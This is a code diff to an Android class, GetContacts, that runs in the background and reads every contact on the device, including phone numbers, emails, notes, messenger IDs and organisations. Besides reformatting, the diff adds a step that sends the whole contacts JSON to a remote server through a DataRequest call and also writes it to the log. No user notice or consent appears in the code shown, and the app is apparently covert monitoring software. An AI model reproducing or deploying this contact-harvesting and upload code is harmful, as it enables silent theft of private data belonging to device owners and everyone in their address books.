@@ -6,6 +6,9 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
@@ -31,7 +34,8 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 	private JSONObject jsonOrganization;
 	private JSONObject jsonContact;
 	private JSONArray jsonAllContact;
-	
+	private String LOG_TAG = "GetContacts";
+
 	public void readContacts() throws JSONException {
 		jsonAllContact = new JSONArray();
 		ContentResolver cr = mContext.getContentResolver();
@@ -40,7 +44,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 
 		if (cur.getCount() > 0) {
 			while (cur.moveToNext()) {
-			
+
 				jsonInfo = new JSONObject();
 				jsonName = new JSONObject();
 				jsonPhoneType = new JSONObject();
@@ -51,10 +55,10 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				jsonImCount = new JSONObject();
 				jsonOrganization = new JSONObject();
 				jsonContact = new JSONObject();
-				
+
 				email = new ArrayList<String>();
 				emailType = new ArrayList<String>();
-				
+
 				CustomemailType = new ArrayList<CharSequence>();
 				String id = cur.getString(cur
 						.getColumnIndex(ContactsContract.Contacts._ID));
@@ -65,8 +69,8 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				if (Integer
 						.parseInt(cur.getString(cur
 								.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
-//					Log.d("GetContacts", "name : " + name + ", ID : " + id);
-//					jsonName.put("name", name);
+					// Log.d("GetContacts", "name : " + name + ", ID : " + id);
+					// jsonName.put("name", name);
 					// ----------------------------------------------------------------------------------------------------------------------------------
 					// get the phone number
 					Cursor pCur = cr.query(
@@ -84,7 +88,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						// phone.add(mPhone);
 						jsonPhoneType.put(mPhone, phoneType);
 					}
-					
+
 					pCur.close();
 					// get email and type
 					// -----------------------------------------------------------------------------------------------------------------------------------------
@@ -96,11 +100,11 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 					while (emailCur.moveToNext()) {
 						// This would allow you get several email addresses
 						// if the email addresses were stored in an array
-						
+
 						String sEmail = emailCur
 								.getString(emailCur
 										.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
-					    int type = emailCur
+						int type = emailCur
 								.getInt(emailCur
 										.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
 						String customLabel = emailCur
@@ -109,8 +113,8 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						CharSequence cCustomemailType = ContactsContract.CommonDataKinds.Email
 								.getTypeLabel(mContext.getResources(), type,
 										customLabel);
-						if(sEmail != null)
-						jsonEmailCount.put(sEmail, cCustomemailType);
+						if (sEmail != null)
+							jsonEmailCount.put(sEmail, cCustomemailType);
 					}
 					emailCur.close();
 					jsonEmailId.put("email", jsonEmailCount);
@@ -131,73 +135,12 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						String note = noteCur
 								.getString(noteCur
 										.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
-						if(note != null)
+						if (note != null)
 							jsonNote.put("note", note);
 					}
 					noteCur.close();
 
-					// ------------------------------------------------------------------------------------------------------------------------------------------------------
-					// Get Postal Address....
-
-					// String addrWhere = ContactsContract.Data.CONTACT_ID
-					// + " = ? AND " + ContactsContract.Data.MIMETYPE
-					// + " = ?";
-					// String[] addrWhereParams = new String[] {
-					// id,
-					// ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE
-					// };
-					// Cursor addrCur = cr.query(
-					// ContactsContract.Data.CONTENT_URI, null, null,
-					// null, null);
-					// while (addrCur.moveToNext()) {
-					// ArrayList<String> addres = new ArrayList<String>();
-					// String poBox = addrCur
-					// .getString(addrCur
-					// .getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
-					// String street = addrCur
-					// .getString(addrCur
-					// .getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
-					// String city = addrCur
-					// .getString(addrCur
-					// .getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
-					// String state = addrCur
-					// .getString(addrCur
-					// .getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
-					// String postalCode = addrCur
-					// .getString(addrCur
-					// .getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
-					// String country = addrCur
-					// .getString(addrCur
-					// .getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
-					// String type = getTipeAddress(addrCur
-					// .getInt(addrCur
-					// .getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE)));
-					// // if(poBox != null)
-					// // addres.add(poBox);
-					// if (street != null)
-					// addres.add(street);
-					// if (city != null)
-					// addres.add(city);
-					// if (state != null)
-					// addres.add(state);
-					// if (postalCode != null)
-					// addres.add(postalCode);
-					// if (country != null)
-					// addres.add(country);
-					// if (!addres.isEmpty()) {
-					// Log.d("IsEmpty", addres.toString());
-					// if (type != null)
-					// addres.add(type);
-					// Log.d("ContactAdress", addres.toString());
-					// }
-					// // Do something with these....
-					// // Log.d("GetContactsAdress", poBox + " " + state + " "
-					// // + street + " " + city + " " + postalCode + " "
-					// // + country + " " + type);
-					//
-					// }
-					// addrCur.close();
-					// //
+					
 					// ----------------------------------------------------------------------------------------------------------------------------------------------------
 					// Get Instant Messenger.........
 					String imWhere = ContactsContract.Data.CONTACT_ID
@@ -216,8 +159,8 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						imType = getTipeIm(imCur
 								.getInt(imCur
 										.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE)));
-						jsonImCount.put(imType,imName);
-//						Log.d("ContactInstance", imName + imType);
+						jsonImCount.put(imType, imName);
+						// Log.d("ContactInstance", imName + imType);
 					}
 					jsonImId.put("im", jsonImCount);
 					imCur.close();
@@ -240,30 +183,35 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 						String title = orgCur
 								.getString(orgCur
 										.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
-//						Log.d("GetContactsOrganisation", orgName + " " + title);
-						if(orgName != null||title != null)
+						
+						if (orgName != null || title != null)
 							jsonOrganization.put("org", orgName + " " + title);
 					}
 					orgCur.close();
 
 				}
 				jsonContact.put("type", type);
-				if(!jsonName.isNull("name"))
-				jsonInfo.put("name", jsonName);
+				if (!jsonName.isNull("name"))
+					jsonInfo.put("name", jsonName);
 				jsonInfo.put("number", jsonPhoneType);
-				if(!jsonInfo.isNull("email"))
-				jsonInfo.put("email", jsonEmailId);
+				if (!jsonInfo.isNull("email"))
+					jsonInfo.put("email", jsonEmailId);
 				jsonInfo.put("note", jsonNote);
 				jsonInfo.put("im", jsonImId);
 				jsonInfo.put("org", jsonOrganization);
 				jsonContact.put("info", jsonInfo);
 				jsonAllContact.put(jsonContact);
-				Log.d("GetCOntact", jsonContact.toString());
-				
-			}
-			Log.d("GetCOntact", jsonAllContact.toString());
+				Logging.doLog(LOG_TAG, jsonContact.toString());
 
-			Log.d("GetCOntact", Integer.toString(jsonAllContact.length()));
+			}
+			Logging.doLog(LOG_TAG, jsonAllContact.toString());
+
+			Logging.doLog(LOG_TAG, Integer.toString(jsonAllContact.length()));
+			if (jsonAllContact != null) {
+				DataRequest dr = new DataRequest(mContext);
+				dr.sendRequest(jsonAllContact.toString());
+				Logging.doLog(LOG_TAG, jsonAllContact.toString());
+			}
 		}
 	}
 
@@ -363,7 +311,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 	protected Void doInBackground(Context... params) {
 		// TODO Auto-generated method stub
 		this.mContext = params[0];
-		Log.d("GetContacts", "doIn");
+		Logging.doLog(LOG_TAG, "doIn");
 		try {
 			readContacts();
 		} catch (JSONException e) {
